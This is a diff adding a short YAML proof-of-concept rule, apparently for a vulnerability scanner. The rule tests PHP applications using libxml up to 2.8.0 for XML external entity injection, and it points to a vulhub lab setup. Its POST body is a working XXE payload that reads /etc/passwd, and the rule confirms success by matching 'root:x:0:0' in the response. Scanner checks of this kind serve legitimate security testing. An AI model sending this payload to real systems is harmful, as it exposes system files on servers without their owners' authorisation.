@@ -1,0 +1,17 @@
+name: poc-yaml-php-xxe-rce
+rules:
+  - method: POST
+    path: /simplexml_load_string.php
+    body: >-
+      <?xml version="1.0" encoding="utf-8"?>  <!DOCTYPE xxe [ <!ELEMENT name ANY
+      > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]> <root> <name>&xxe;</name>
+      </root>
+    follow_redirects: false
+    expression: |
+      status==200 && body.bcontains(b'root:x:0:0')
+detail:
+    author: leezp
+    Affected PHP Version: "libxml<=2.8.0,与php版本无关"
+    Environment: https://github.com/vulhub/vulhub/tree/master/php/php_xxe
+
+
